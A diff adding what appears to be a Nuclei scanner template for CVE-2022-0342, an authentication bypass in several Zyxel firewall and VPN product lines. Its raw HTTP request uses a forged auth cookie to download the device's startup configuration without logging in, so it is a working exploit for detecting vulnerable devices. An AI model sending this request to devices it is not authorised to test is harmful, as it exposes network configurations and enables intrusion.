@@ -1,0 +1,32 @@
+id: cve-2022-0342
+info:
+  name: Zyxel Authentication Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Zyxel USG/ZyWALL 4.20 to 4.70, USG FLEX 4.50 to 5.20, ATP 4.32 to 5.20, VPN 4.30 to 5.20, NSG 1.20 to 1.33 Patch 4 have security vulnerabilities, which can be exploited by attackers to circumvent authenticate over the web and gain administrative access to the device.
+  reference:
+    - https://security.humanativaspa.it/zyxel-authentication-bypass-patch-analysis-cve-2022-0342/
+  tags: permission-bypass
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/export-cgi?category=config&arg0=startup-config.conf HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: authtok=AAAAAAA; secuRtBannerClsCookie=login
+        Connection: close
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Content-Disposition: attachment;"
+      - type: word
+        part: body
+        words:
+          - "firmware version"
